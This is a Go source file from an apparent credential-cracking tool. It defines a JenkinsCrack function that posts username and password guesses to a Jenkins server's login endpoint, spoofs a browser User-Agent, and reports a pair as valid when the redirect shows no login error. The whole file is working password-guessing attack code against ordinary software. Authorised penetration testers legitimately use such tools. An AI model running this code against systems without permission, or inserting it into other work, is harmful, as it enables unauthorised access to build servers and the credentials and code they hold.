package crack

import (
	"cube/model"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func JenkinsCrack(task model.CrackTask) (result model.CrackTaskResult) {
	result = model.CrackTaskResult{CrackTask: task, Result: "", Err: nil}
	clt := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	urlValues := url.Values{}
	urlValues.Add("j_username", task.Auth.User)
	urlValues.Add("j_password", task.Auth.Password)
	body := strings.NewReader(urlValues.Encode())
	req, _ := http.NewRequest("POST", task.Ip+"/j_spring_security_check", body)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	res, err := clt.Do(req)
	if err != nil {
		panic(err)
	}
	defer res.Body.Close()

	if !strings.Contains(res.Header.Get("Location"), "loginError") {
		result.Result = fmt.Sprintf("User: %s \t Password: %s", task.Auth.User, task.Auth.Password)
	}
	return result
}
